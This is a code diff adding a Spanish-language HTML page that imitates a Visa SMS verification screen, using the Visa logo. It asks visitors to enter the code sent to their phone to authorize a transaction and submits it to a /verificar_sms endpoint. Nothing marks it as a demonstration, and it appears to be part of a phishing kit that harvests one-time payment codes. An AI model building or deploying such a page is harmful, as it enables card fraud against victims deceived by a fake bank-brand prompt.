@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { width: 85%; max-width: 350px; margin: auto; padding: 20px; border: 1px solid #ccc; border-top: 5px solid blue; }
+        .in { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #444; text-align: center; font-size: 20px; }
+        .btn { width: 100%; padding: 15px; background: blue; color: white; border: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="100">
+        <h3>Verificación SMS</h3>
+        <p>Ingrese el código enviado a su móvil para autorizar la transacción.</p>
+        <form action="/verificar_sms" method="POST">
+            <input type="text" name="sms_code" class="in" placeholder="000000" maxlength="8" required>
+            <button class="btn">VERIFICAR</button>
+        </form>
+    </div>
+</body>
+</html>
